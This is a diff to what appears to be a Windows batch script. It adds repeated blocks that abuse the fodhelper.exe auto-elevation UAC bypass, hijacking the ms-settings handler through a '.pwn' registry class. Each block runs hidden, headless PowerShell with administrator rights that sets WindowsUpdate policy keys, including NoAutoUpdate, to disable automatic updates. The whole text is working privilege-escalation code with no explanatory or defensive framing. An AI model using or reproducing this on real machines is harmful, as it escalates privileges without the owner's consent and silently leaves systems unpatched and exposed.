@@ -38,6 +38,16 @@ powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
 fodhelper.exe
 cls
+powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force
+powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
+fodhelper.exe
+cls
+powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\WindowsUpdate\AU NoAutoUpdate 1""" -Force
+powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
+powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
+fodhelper.exe
+cls
 powershell New-Item -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Value """conhost --headless powershell -sta -noProfile -NonInteractive -nologo -WindowStyle hidden -Command Set-itemproperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU AuOptions 4""" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\.pwn\Shell\Open\command -Name DelegateExecute -PropertyType String -Force
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\CurVer -Value .pwn -Force
